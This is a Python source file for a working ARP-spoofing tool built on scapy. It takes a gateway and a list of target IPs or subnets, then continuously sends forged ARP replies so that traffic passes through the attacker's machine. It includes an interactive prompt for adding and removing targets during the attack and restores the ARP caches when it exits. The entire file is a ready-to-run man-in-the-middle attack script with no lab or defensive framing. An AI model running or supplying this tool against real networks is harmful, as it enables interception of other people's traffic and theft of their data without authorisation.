#!/usr/bin/env python3
import sys
import argparse
import ipaddress
import logging
import threading
import queue
import time
from scapy.all import (ARP, Ether, sendp, srp,
                       get_if_addr, get_if_hwaddr, conf)

log = logging.getLogger('arpspoof')

# index values into tuples
IP = CMD = 0
MAC = TARGET = 1


def configure_logging(level, log_file=None):
    # our logs go to stderr so they never corrupt the interactive prompt on
    # stdout; %(threadName)s tells the poison thread and the REPL apart
    handlers = [logging.StreamHandler(sys.stderr)]
    if log_file:
        try:
            handlers.append(logging.FileHandler(log_file))
        except OSError as e:
            print('Could not open log file %s: %s' % (log_file, e),
                  file=sys.stderr)
    logging.basicConfig(
        level=level,
        format='%(asctime)s [%(levelname)-8s] (%(threadName)s) %(message)s',
        datefmt='%H:%M:%S',
        handlers=handlers,
    )
    # scapy is chatty at DEBUG; keep it to warnings so our own DEBUG stays readable
    logging.getLogger('scapy').setLevel(logging.WARNING)


def parse_args():
    parser = argparse.ArgumentParser(description='Do ARP poisoning between ' +
                                                 'a gatway and several ' +
                                                 'targets')
    parser.add_argument('-i', '--interface', dest='interface',
                        help='interface to send from')
    parser.add_argument('-t', '--targets', dest='targets',
                        help='comma-separated list of IP addresses and/or ' +
                             'CIDR subnets',
                        required=True)
    parser.add_argument('-g', '--gateway', dest='gateway',
                        help='IP address of the gateway', required=True)
    parser.add_argument('-v', '--verbose', action='count', default=0,
                        help='increase log verbosity (repeat for more)')
    parser.add_argument('-q', '--quiet', action='store_true',
                        help='only log warnings and errors')
    parser.add_argument('--log-file', dest='log_file',
                        help='also append logs to this file')
    return parser.parse_args()


def expand_targets(spec):
    # turn a comma-separated list of IPs and/or CIDR subnets into a flat,
    # order-preserving, de-duplicated list of individual IP strings
    ips = []
    for item in spec.split(','):
        item = item.strip()
        if not item:
            continue
        try:
            if '/' in item:
                for host in ipaddress.ip_network(item, strict=False).hosts():
                    ips.append(str(host))
            else:
                ips.append(str(ipaddress.ip_address(item)))
        except ValueError:
            log.warning('Skipping invalid address: %s', item)

    seen = set()
    unique = []
    for ip in ips:
        if ip not in seen:
            seen.add(ip)
            unique.append(ip)
    log.debug('Expanded "%s" into %d unique address(es)', spec, len(unique))
    return unique


def arp_probe(interface, ips, timeout=2):
    # send one broadcast ARP request per IP and collect replies; scapy sends
    # the whole batch before waiting, so N hosts resolve in ~timeout, not N*timeout
    if not ips:
        return {}

    source_IP = get_if_addr(interface)
    source_MAC = get_if_hwaddr(interface)
    broadcast = 'ff:ff:ff:ff:ff:ff'
    probes = [Ether(src=source_MAC, dst=broadcast) /
              ARP(op=1, hwsrc=source_MAC, psrc=source_IP, pdst=ip)
              for ip in ips]

    log.debug('Sending %d ARP probe(s) on %s (timeout=%ss)',
              len(probes), interface, timeout)
    answered, _ = srp(probes, iface=interface, timeout=timeout, verbose=0)
    result = {rcv.psrc: rcv.hwsrc for _, rcv in answered}
    log.debug('Probe round resolved %d/%d host(s)', len(result), len(probes))
    return result


def get_MAC(interface, target_IP):
    # get the MAC address of target_IP and return it
    result = arp_probe(interface, [target_IP], timeout=5)
    if target_IP not in result:
        # received no reply
        raise Exception('Error finding MAC for %s, try using -i' % target_IP)
    log.debug('Resolved %s -> %s', target_IP, result[target_IP])
    return result[target_IP]


def get_targets(interface, ips, timeout=2, retries=2):
    # batch-resolve a list of IPs, retrying hosts that did not answer
    resolved = {}
    pending = list(ips)
    for attempt in range(retries + 1):
        if not pending:
            break
        log.debug('Resolution pass %d/%d for %d host(s)',
                  attempt + 1, retries + 1, len(pending))
        resolved.update(arp_probe(interface, pending, timeout=timeout))
        pending = [ip for ip in pending if ip not in resolved]

    targets = [(ip, resolved[ip]) for ip in ips if ip in resolved]
    missing = [ip for ip in ips if ip not in resolved]
    return targets, missing


def start_poison_thread(targets, gateway, control_queue, attacker_MAC,
                        interface):
    finish = False
    log.info('Poison thread started: %d target(s) via gateway %s (%s)',
             len(targets), gateway[IP], gateway[MAC])
    # the control queue is used to send commands to the poison thread
    # as soon as the thread finds the queue not empty, it will stop poisoning
    # and evaluate the item in the queue. It will process the command and then
    # either continue poisoning or finish its execution
    while not finish:
        # as long as no elements are in the queue, we will send ARP messages
        while control_queue.empty():
            for t in targets:
                send_ARP(t[IP], t[MAC], gateway[IP], attacker_MAC, interface)
                send_ARP(gateway[IP], gateway[MAC], t[IP], attacker_MAC,
                         interface)
            log.debug('Poisoned %d target(s) this round', len(targets))
            time.sleep(1)

        # queue not empty, pull the element out of the queue to empty it again
        try:
            # item is a 2-element tuple (command, (IP, MAC))
            # item[CMD] = command, item[TARGET] = (IP, MAC)
            item = control_queue.get(block=False)
        except queue.Empty:
            # The Empty exception is thrown when there is no element in the
            # queue. Something clearly is not working as it should...
            log.error('Control queue reported empty after passing the check')
            continue

        cmd = item[CMD].lower()
        log.debug('Control command received: %s', cmd)
        if cmd in ['quit', 'exit', 'stop', 'leave']:
            # command to terminate the thread received
            log.info('Stop command received, ending poison loop')
            finish = True

        elif cmd in ['add', 'insert']:
            targets.append(item[TARGET])
            log.info('Added target %s (%s), %d target(s) active',
                     item[TARGET][IP], item[TARGET][MAC], len(targets))

        elif cmd in ['del', 'delete', 'remove']:
            try:
                targets.remove(item[TARGET])
                restore_ARP_caches([item[TARGET]], gateway, False, interface)
                log.info('Removed target %s (%s), %d target(s) active',
                         item[TARGET][IP], item[TARGET][MAC], len(targets))
            except ValueError:
                log.warning('%s not in target list', item[TARGET][IP])

        elif cmd in ['list', 'show', 'status']:
            log.info('Current targets (gateway %s (%s)):',
                     gateway[IP], gateway[MAC])
            for t in targets:
                log.info('  %s (%s)', t[IP], t[MAC])
    # we are done, reset every host
    log.info('Poison thread exiting, restoring ARP caches')
    restore_ARP_caches(targets, gateway, True, interface)


def restore_ARP_caches(targets, gateway, verbose=True, interface=None):
    # send correct ARP responses to the targets and the gateway
    log.info('Restoring ARP caches for %d target(s)', len(targets))
    for i in range(3):
        if verbose:
            log.debug('ARP %s is at %s', gateway[IP], gateway[MAC])
        for t in targets:
            if verbose:
                log.debug('ARP %s is at %s', t[IP], t[MAC])
            send_ARP(t[IP], t[MAC], gateway[IP], gateway[MAC], interface)
            send_ARP(gateway[IP], gateway[MAC], t[IP], t[MAC], interface)
        time.sleep(1)
    log.info('ARP caches restored')


def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC,
             interface):
    # op=2 is an ARP response
    # psrc/hwsrc is the data we want the destination to learn
    # build the Ether layer ourselves so the frame goes to the exact MAC we
    # intend, instead of letting scapy route it (which falls back to
    # broadcast and logs "should be providing the destination MAC" warnings)
    if not destination_MAC:
        destination_MAC = 'ff:ff:ff:ff:ff:ff'
    pkt = (Ether(dst=destination_MAC) /
           ARP(op=2, hwdst=destination_MAC, hwsrc=source_MAC,
               pdst=destination_IP, psrc=source_IP))
    log.debug('ARP is-at -> %s: %s is at %s',
              destination_IP, source_IP, source_MAC)
    try:
        sendp(pkt, iface=interface, verbose=0)
    except Exception:
        log.exception('Failed to send ARP is-at to %s (%s)',
                      destination_IP, destination_MAC)


def main():
    args = parse_args()

    if args.quiet:
        level = logging.WARNING
    elif args.verbose:
        level = logging.DEBUG
    else:
        level = logging.INFO
    configure_logging(level, args.log_file)
    log.info('arpspoof starting up')

    control_queue = queue.Queue()

    # use supplied interface or let scapy choose one
    interface = args.interface or conf.iface
    attacker_MAC = get_if_hwaddr(interface)
    attacker_IP = get_if_addr(interface)
    log.info('Using interface %s (attacker %s / %s)',
             interface, attacker_IP, attacker_MAC)

    # normalise and validate the gateway up front; it is the peer we
    # impersonate, so it must never appear in the target list
    try:
        gateway_IP = str(ipaddress.ip_address(args.gateway))
    except ValueError:
        log.error('Invalid gateway address: %s', args.gateway)
        sys.exit(2)

    # args.targets is a comma-separated list of IP addresses and/or CIDR
    # subnets, e.g. -t 10.1.1.2,10.1.1.32,10.1.1.0/24
    target_ips = expand_targets(args.targets)
    if not target_ips:
        log.error('No valid target addresses in "%s"', args.targets)
        sys.exit(1)

    # never poison the gateway (we impersonate it) or our own interface
    # address (that would route our own traffic through ourselves)
    protected = {gateway_IP: 'gateway',
                 str(ipaddress.ip_address(attacker_IP)): 'local interface'}
    filtered = []
    for ip in target_ips:
        if ip in protected:
            log.warning('Skipping target %s: it is the %s address',
                        ip, protected[ip])
        else:
            filtered.append(ip)
    target_ips = filtered
    if not target_ips:
        log.error('No targets left after skipping gateway/local addresses')
        sys.exit(1)

    log.info('Resolving %d target address(es)...', len(target_ips))
    targets, missing = get_targets(interface, target_ips)
    for ip, mac in targets:
        log.debug('Target %s (%s)', ip, mac)
    if missing:
        log.warning('No ARP reply from %d host(s): %s',
                    len(missing), ', '.join(missing))
    if not targets:
        # nothing resolved, check if -t or -i are actually valid
        log.error('Could not resolve any target, try using -i')
        sys.exit(1)

    # gateway is a (IP, MAC) tuple
    try:
        gateway = (gateway_IP, get_MAC(interface, gateway_IP))
    except Exception as e:
        log.error('Could not resolve gateway %s: %s', gateway_IP, e)
        sys.exit(2)
    log.info('Gateway %s (%s)', gateway[IP], gateway[MAC])
    log.info('Targets: %s', ', '.join('%s (%s)' % t for t in targets))

    # create and start the poison thread
    poison_thread = threading.Thread(target=start_poison_thread,
                                     args=(targets, gateway, control_queue,
                                           attacker_MAC, interface),
                                     name='poison')
    poison_thread.start()

    try:
        while poison_thread.is_alive():
            time.sleep(1)  # delay is a quick hack to kind of sync output
                           # w/o this, the thread output messes up the prompt
                           # TODO: think of something a little less ugly
            command = input('arpspoof# ').split()
            if command:
                cmd = command[CMD].lower()
                log.debug('User command: %s', ' '.join(command))
                if cmd in ['help', '?']:
                    print("add <IP>: add IP address to target list\n" +
                          "del <IP>: remove IP address from target list\n" +
                          "list: print all current targets\n" +
                          "exit: stop poisoning and exit")

                elif cmd in ['quit', 'exit', 'stop', 'leave']:
                    log.info('Shutting down on user request...')
                    control_queue.put(('quit',))
                    poison_thread.join()

                elif cmd in ['add', 'insert', 'del', 'delete', 'remove']:
                    if len(command) < 2:
                        log.warning('Usage: %s <IP>' % cmd)
                        continue
                    try:
                        ip = str(ipaddress.ip_address(command[TARGET]))
                    except ValueError:
                        log.error('Invalid IP address: %s', command[TARGET])
                        continue
                    if cmd in ['add', 'insert'] and ip in protected:
                        log.warning('Not adding %s: it is the %s address',
                                    ip, protected[ip])
                        continue
                    try:
                        t = (ip, get_MAC(interface, ip))
                        log.info('Resolved %s (%s) for command "%s"',
                                 ip, t[MAC], cmd)
                        control_queue.put((cmd, t))
                    except Exception as e:
                        log.error('Cannot %s %s: %s', cmd, ip, e)

                elif cmd in ['list', 'show', 'status']:
                    control_queue.put((cmd,))
                else:
                    log.warning('Unknown command: %s (try "help")', cmd)

    except KeyboardInterrupt:
        # Ctrl+C detected, so let's finish the poison thread and exit
        log.info('Interrupted, shutting down...')
        control_queue.put(('quit',))
        poison_thread.join()
    except EOFError:
        log.info('End of input, shutting down...')
        control_queue.put(('quit',))
        poison_thread.join()

    log.info('arpspoof stopped')


if __name__ == '__main__':
    main()
